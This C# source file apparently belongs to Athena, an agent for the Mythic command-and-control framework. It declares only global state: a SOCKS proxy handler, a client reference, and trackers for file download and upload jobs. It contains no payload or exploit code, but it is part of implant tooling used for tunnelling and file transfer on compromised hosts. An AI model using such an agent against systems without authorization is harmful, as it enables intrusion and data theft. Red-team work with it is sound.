using System.Collections.Generic;
using System.Runtime.Loader;
using System.Reflection;
using Athena.Commands.Model;
using Athena.Models.Mythic.Tasks;

namespace Athena
{
    public class Globals
    {
        //Single Trackers
        public static SocksHandler socksHandler = new SocksHandler();
        public static MythicClient mc;

        //Multi-Trackers Non-ThreadSafe
        public static Dictionary<string, MythicDownloadJob> downloadJobs = new Dictionary<string, MythicDownloadJob>();
        public static Dictionary<string, MythicUploadJob> uploadJobs = new Dictionary<string, MythicUploadJob>();
    }
}
